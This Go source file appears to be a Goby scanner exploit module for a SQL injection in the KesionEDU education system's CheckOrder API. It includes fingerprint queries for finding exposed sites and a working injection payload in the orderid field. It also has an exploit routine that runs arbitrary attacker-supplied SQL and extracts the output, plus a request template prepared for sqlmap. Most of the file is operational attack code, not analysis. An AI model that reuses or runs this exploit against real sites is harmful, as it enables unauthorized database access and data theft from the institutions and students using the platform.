package exploits

import (
	"errors"
	"fmt"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "KesionEDU CheckOrder SQL Injection Vulnerability",
    "Description": "<p>KESION-Leading-Online-Edu-System is a platform specifically designed for educational training enterprises, providing an independent brand operation platform. It supports multi-terminal learning with PC, public accounts (H5), mini-programs, and independent apps. It offers various versions, including an independent operation version and a platform version for institutional entry, allowing educational institutions to choose according to their needs. It is the ideal choice for educational enterprises and institutions to achieve brand development.</p>",
    "Product": "KESION-Leading-Online-Edu-System",
    "Homepage": "https://www.kesion.com/",
    "DisclosureDate": "2024-08-21",
    "PostTime": "2024-08-21",
    "Author": "1538279017@qq.com",
    "FofaQuery": "(body=\"/KS_Inc/static/edu\") || (body=\"/tp/PC/skin05\" && body=\"class-type fl type-poster\")",
    "GobyQuery": "(body=\"/KS_Inc/static/edu\") || (body=\"/tp/PC/skin05\" && body=\"class-type fl type-poster\")",
    "Level": "2",
    "Impact": "<p>SQL injection is an attack technique where attackers inject malicious SQL code into an application's queries to perform unauthorized operations on a database. The risks of such vulnerabilities include data leakage, data manipulation, data deletion, and complete control over the database. Attackers can steal sensitive data, compromise data integrity, and even gain full control over the database server, leading to severe security threats.</p>",
    "Recommendation": "<p>To protect against SQL injection attacks, applications should use parameterized queries (also known as prepared statements) to handle user inputs. Parameterized queries treat user inputs as parameters rather than directly embedding them into SQL statements, ensuring that input data is not interpreted as SQL code, thereby effectively preventing injection attacks.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "@@version",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "HW-2024"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8",
    "Translation": {
        "CN": {
            "Name": "科汛新职教网校系统 CheckOrder SQL 注入漏洞",
            "Product": "KESION-领先在线教育系统",
            "Description": "<p>科汛网校系统专为教育培训企业提供独立品牌运营平台，支持PC+公众号(H5)+小程序+独立APP多终端学习，拥有独立运营版，机构入驻平台版等多个版本可供教育机构选择，是教育企业机构实现品牌发展的不二选择<br></p>",
            "Recommendation": "<p>为了防护 SQL 注入攻击，应用程序应使用参数化查询（也称为预处理语句）来处理用户输入。参数化查询将用户输入作为参数传递，而不是直接嵌入到 SQL 语句中，这样可以确保输入数据不会被解释为 SQL 代码，从而有效防止注入攻击。<br></p>",
            "Impact": "<p>SQL 注入是一种攻击技术，攻击者通过将恶意的 SQL 代码注入到应用程序的查询中，从而对数据库进行未授权的操作。这种漏洞的危害包括数据泄露、数据篡改、数据删除以及数据库的完全控制。攻击者可以窃取敏感数据、破坏数据完整性，甚至完全控制数据库服务器，从而造成严重的安全隐患。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "KesionEDU CheckOrder SQL Injection Vulnerability",
            "Product": "KESION-Leading-Online-Edu-System",
            "Description": "<p>KESION-Leading-Online-Edu-System is a platform specifically designed for educational training enterprises, providing an independent brand operation platform. It supports multi-terminal learning with PC, public accounts (H5), mini-programs, and independent apps. It offers various versions, including an independent operation version and a platform version for institutional entry, allowing educational institutions to choose according to their needs. It is the ideal choice for educational enterprises and institutions to achieve brand development.<br></p>",
            "Recommendation": "<p>To protect against SQL injection attacks, applications should use parameterized queries (also known as prepared statements) to handle user inputs. Parameterized queries treat user inputs as parameters rather than directly embedding them into SQL statements, ensuring that input data is not interpreted as SQL code, thereby effectively preventing injection attacks.<br></p>",
            "Impact": "<p>SQL injection is an attack technique where attackers inject malicious SQL code into an application's queries to perform unauthorized operations on a database. The risks of such vulnerabilities include data leakage, data manipulation, data deletion, and complete control over the database. Attackers can steal sensitive data, compromise data integrity, and even gain full control over the database server, leading to severe security threats.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9941"
}`

	sendPayloadfdsfdhjhvbff := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		//POST请求
		setPostRequest := func(hostInfo *httpclient.FixUrl, url string, payload string, head map[string]string) (*httpclient.HttpResponse, error) {
			postRequest := httpclient.NewPostRequestConfig(url)
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			postRequest.Data = payload
			for headName, headValue := range head {
				postRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}
		//按需求选择自己的发包方式

		//---------------------------------------------
		//以下是发包具体内容,这里以POST请求为例
		//---------------------------------------------
		//漏洞的url
		url := `/webapi/APP/CheckOrder`
		//拼接sql语句
		body := fmt.Sprintf(`{"orderid":"1' AND 7755 IN (%s)-- OKQQ","apptoken":"1","ordertype":"1"}`, sql)
		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
			"Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
			"Accept-Encoding": "gzip, deflate",
			"Dnt":             "1",
			"Referer":         hostInfo.FixedHostInfo,
			"Content-Type":    "application/x-www-form-urlencoded",
			"Cookie":          "SESS_IDS=prar0e5k1sg95nfsi446rejfp6",
		}
		resp, err := setPostRequest(hostInfo, url, body, header)
		if err != nil {
			return nil, err
		}
		//状态码可自定义,这里默认200
		if resp.StatusCode != 500 {
			return nil, errors.New("not response 500")
		}
		return resp, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			sendPayload := sendPayloadfdsfdhjhvbff
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符,(select sql from sqlite_master)查询表名
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符

			//检测逻辑,联合注入检测 这里模仿了sqlmap的检测逻辑,让它成功执行sql语句并回显一个字符串,然后我们去匹配

			//如果是其他类型的注入,请按照具体情况进行检测
			sql := "SELECT (CHAR(113)+CHAR(107)+CHAR(112)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (7755=7755) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(107)+CHAR(107)+CHAR(113))"
			resp, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			if !strings.Contains(resp.Utf8Html, "qkpzq1qqkkq") {
				return false
			}
			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + `/webapi/APP/CheckOrder`
			return true
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			sendPayload := sendPayloadfdsfdhjhvbff
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			sql := goutils.B2S(stepLogs.Params["sql"])
			//Switch ExpParams
			//若自己修改ExpParams,请自行修改switch case
			switch attackType {
			case "sql":
				resp, err := sendPayload(expResult.HostInfo, sql)
				if err != nil && strings.Contains(err.Error(), "not response 200") {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}

				// 正则匹配利用结果,需自己修改
				// 注意正则匹配返回的结果的数组序号,一般是mathch[1],请先检测到是否匹配到内容,防止panic
				re := regexp.MustCompile(`'([^']*)'`)
				match := re.FindStringSubmatch(resp.Utf8Html)
				if len(match) < 1 {
					//正则失败
					expResult.Output = `Exploitation failed.`
					expResult.Success = false
					return expResult
				}
				expResult.Success = true

				expResult.Output = `The key points you need to extract is : ` + match[1]
				return expResult

			case "sqlPoint":
				_, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `Exploitation failed: ` + err.Error()
					expResult.Success = false
					return expResult
				}
				//sqlPoint,给用户跑sqlmap用,需修改对应的参数
				expResult.Success = true
				expResult.Output = `POST /webapi/APP/CheckOrder HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Connection: close
Cookie: SESS_IDS=prar0e5k1sg95nfsi446rejfp6
Content-Type: application/x-www-form-urlencoded

{"orderid":"1*","apptoken":"1","ordertype":"1"}
`
				return expResult
			//检查ExpParams是否设置正确
			default:
				expResult.Output = `Unknown attack type: ` + attackType
				expResult.Success = false
				return expResult
			}
		},
	))
}
